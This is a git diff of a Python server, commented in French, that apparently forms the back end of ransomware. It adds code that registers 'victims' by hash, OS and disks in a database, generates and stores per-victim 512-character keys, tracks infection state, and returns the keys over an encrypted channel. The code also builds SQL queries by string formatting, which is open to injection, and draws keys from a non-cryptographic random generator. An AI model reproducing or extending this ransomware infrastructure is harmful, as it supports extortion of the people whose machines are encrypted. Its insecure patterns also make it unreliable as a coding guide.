@@ -18,6 +18,36 @@ PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))
 def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
     return ''.join(random.choice(caracteres) for i in range(longueur))
 
+def check_hash(conn, hash_victim):
+    """
+    Vérifie si la signature hash de la victime est déjà enregistré en DB
+    :param conn:
+    :param hash_victim: Signature de la victime
+    :return: (list ou None) id_victim et key si trouvé
+    """
+    query = f'''
+    SELECT victims.id_victim,  victims.key
+    FROM victims
+    WHERE victims.hash = "{hash_victim}"
+    '''
+    victim = data.select_data(conn, query)
+    if not victim:
+        if DEBUG_MODE:
+            print(f"Pas de victime avec le hash : {hash_victim[-12:]}")
+        return None
+    else:
+        victim = list(victim[0])    # Transforme la liste de tuples en une liste simple
+        if DEBUG_MODE:
+            print(f"Une victime avec le hash {hash_victim[-12:]} existe en DB sur l'ID {victim[0]}")
+        # Recherche le dernier état en DB pour cette victime
+        query = f'''
+        SELECT states.state, MAX(states.datetime)
+        FROM states
+        WHERE states.id_victim = {victim[0]}
+        '''
+        last_state = (data.select_data(conn, query))[0][0]
+        victim.append(last_state)
+        return victim
 def ajout_victim(db, id, os, disk, key):
     # Insérer les données de la victime dans la table 'victims'
     data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
@@ -65,6 +95,21 @@ def main():
             print("Historique de la victime")
         if msg_type == 'CHANGE_STATE':
             print("Changement d'état")
+        if msg_type == 'INITIALIZE_REQ':
+            # Check si HASH existe déjà en DB
+            victim = check_hash(connexion_db, msg['INITIALIZE'])  # Retourne l'id_victim + key_victim + last_state
+            if victim is None:
+                # Génère la nouvelle clé
+                key_victim = generate_key(512)
+                # Enregistrement en DB de la nouvelle victime
+                id_victim = ajout_victim(connexion_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
+                victim = [id_victim, key_victim, 'INITIALIZE']
+            # Envoie du initialize_key
+            msg = utile.message.set_message('initialize_key', victim)
+            # Envoi du msg sur la queue q_response_console
+            print(f"Put msg {msg}")
+            fifo_rep_front.put(msg)
+            fifo_rep_front.join()
 
 
 def thread_console(fifo_db, fifo_rep_console):
@@ -114,6 +159,7 @@ def thread_frontal(fifo_db, fifo_rep_front):
             msg = network.receive_message(socket_front)
             msg = security.aes_decrypt(msg, aes_key)
             msg_type = utile.message.get_message_type(msg)
+            print("Message reçu : " + str(msg) + "Son type : " + str(msg_type))
             if msg_type == 'INITIALIZE_REQ':
                 fifo_db.put(msg)
                 msg = fifo_rep_front.get()
